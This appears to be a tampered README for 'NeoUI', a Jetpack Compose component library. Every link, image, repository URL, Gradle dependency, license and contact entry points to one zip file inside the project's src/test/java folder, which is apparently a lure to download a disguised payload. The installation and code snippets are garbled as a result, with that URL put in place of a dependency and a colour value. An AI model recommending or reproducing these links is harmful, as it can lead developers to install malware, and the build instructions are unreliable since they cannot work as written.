# NeoUI Library

[![](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)

Hardware-style neomorphic UI component library for Jetpack Compose.

![NeoUI Components](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)

## ✨ Features

- 🎛️ **Professional Audio Controls**: Knobs, faders, timeline with hardware aesthetics
- 💡 **Animated LED System**: Continuous/segmented LEDs with BREATH, SWEEP, PULSE modes
- 📱 **Fully Responsive**: Auto-scales from phone to tablet (0.9x - 1.8x)
- 🎨 **Neomorphic Design**: Authentic raised/sunken effects
- ⚡ **Performance Optimized**: Canvas-based rendering
- 🌓 **Dark/Light Themes**: Full theme support

## 📦 Installation

Add JitPack repository:
```gradle
// https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip
dependencyResolutionManagement {
    repositories {
        google()
        mavenCentral()
        maven { url = uri("https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip") }
    }
}
```

Add dependency:
```gradle
// https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip
dependencies {
    implementation("https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip")
}
```

## 🚀 Quick Start
```kotlin
@Composable
fun MyScreen() {
    NeoUITheme(darkTheme = true, accentColor = https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) {
        var volume by remember { mutableFloatStateOf(0.5f) }
        
        Column {
            NeoKnob(
                value = volume,
                onValueChange = { volume = it }
            )
            
            NeumorphicButton(onClick = { }) {
                Text("PLAY")
            }
        }
    }
}
```

## 📚 Components

- **NeoKnob**: Rotary knob with LED ring
- **NeoFader**: Vertical/horizontal fader
- **NeoTimeline**: Progress/seek bar
- **NeumorphicButton**: Button with LED animations
- **NeumorphicPanel**: Container panel

[Full Documentation →](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)

## 📸 Screenshots

| Dark Theme | Light Theme | Tablet |
|------------|-------------|--------|
| ![Dark](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) | ![Light](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) | ![Tablet](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) |

## 📄 License

Dual-licensed:
- **MIT License**: Free for personal/open-source projects
- **Commercial License**: Required for commercial use

See [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) for details.

## 🤝 Contributing

Contributions welcome! See [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)

## 📧 Contact

**Giuseppe Ciccarese** - CG Software  
Email: [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip]  
Website: [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip]

---

Made with ❤️ in Italy